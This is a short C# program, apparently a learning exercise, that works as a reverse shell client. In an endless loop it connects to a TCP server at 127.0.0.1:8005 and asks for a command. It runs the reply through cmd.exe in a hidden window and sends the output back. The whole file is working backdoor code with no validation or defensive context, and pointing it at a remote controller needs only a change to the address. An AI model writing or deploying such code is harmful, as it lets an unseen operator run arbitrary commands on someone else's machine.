﻿using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace ServerClient
{
    class Program
    {
        static int port = 8005; // порт сервера
        static string address = "127.0.0.1"; // адрес сервера
        static void Main(string[] args)
        {
            while (1 == 1)
            {
                try
                {
                    IPEndPoint ipPoint = new IPEndPoint(IPAddress.Parse(address), port);

                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    // подключаемся к удаленному хосту
                    socket.Connect(ipPoint);
                    string message = "Give me a command!";
                    byte[] data = Encoding.Unicode.GetBytes(message);
                    socket.Send(data);

                    // получаем ответ
                    data = new byte[256]; // буфер для ответа
                    StringBuilder builder = new StringBuilder();
                    int bytes = 0; // количество полученных байт

                    do
                    {
                        bytes = socket.Receive(data, data.Length, 0);
                        builder.Append(Encoding.Unicode.GetString(data, 0, bytes));
                    }
                    while (socket.Available > 0);
                    string a = builder.ToString();
                    Console.WriteLine($"{a}");
                    Process run = new Process();
                    run.StartInfo.FileName = "cmd.exe";
                    run.StartInfo.Arguments = $"/C {a}";
                    run.StartInfo.UseShellExecute = false;
                    run.StartInfo.CreateNoWindow = true;
                    run.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(850);
                    run.StartInfo.RedirectStandardOutput = true;
                    //run.StartInfo.RedirectStandardError = true;
                    run.Start();
                    StreamReader output = run.StandardOutput;
                    //Console.WriteLine(reader.ReadToEnd());
                    //StreamReader error = run.StandardError;
                    socket.Send(Encoding.Unicode.GetBytes(output.ReadToEnd()));
                    //socket.Send(Encoding.Unicode.GetBytes(error.ReadToEnd()));
                    // закрываем сокет
                    socket.Shutdown(SocketShutdown.Both);
                    socket.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }
    }
}
